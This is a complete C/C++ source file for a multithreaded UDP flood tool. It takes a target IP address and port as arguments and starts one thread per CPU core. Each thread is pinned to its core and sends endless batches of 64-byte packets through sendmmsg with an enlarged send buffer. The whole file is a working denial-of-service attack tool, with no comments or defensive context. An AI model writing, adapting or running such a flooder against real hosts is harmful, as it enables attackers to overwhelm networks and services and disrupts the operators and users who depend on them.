#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

constexpr int VLEN = 1024;
constexpr int PAYLOAD_SIZE = 64;

struct thread_args {
    char target_ip[16];
    uint16_t target_port;
    int core_id;
};

void* flood_thread(void* arg) {
    auto args = (struct thread_args*)arg;

    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(args->core_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return nullptr;

    int optval = 1024 * 1024 * 10;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval));

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target.sin_addr);

    char payload[PAYLOAD_SIZE];
    memset(payload, 0xFF, PAYLOAD_SIZE);

    struct iovec iov[VLEN];
    struct mmsghdr msgs[VLEN];

    for (int i = 0; i < VLEN; i++) {
        iov[i].iov_base = payload;
        iov[i].iov_len = PAYLOAD_SIZE;

        msgs[i].msg_hdr.msg_name = &target;
        msgs[i].msg_hdr.msg_namelen = sizeof(target);
        msgs[i].msg_hdr.msg_iov = &iov[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_control = nullptr;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
    }

    for (;;) {
        sendmmsg(sock, msgs, VLEN, 0);
    }

    return nullptr;
}

int main(int argc, char *argv[]) {
    if (argc != 3) return 1;

    long num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    pthread_t threads[num_cores];
    struct thread_args targs[num_cores];

    for (long i = 0; i < num_cores; i++) {
        strncpy(targs[i].target_ip, argv[1], 15);
        targs[i].target_ip[15] = '\0';
        targs[i].target_port = (uint16_t)atoi(argv[2]);
        targs[i].core_id = i;

        pthread_create(&threads[i], nullptr, flood_thread, &targs[i]);
    }

    for (long i = 0; i < num_cores; i++) {
        pthread_join(threads[i], nullptr);
    }

    return 0;
}
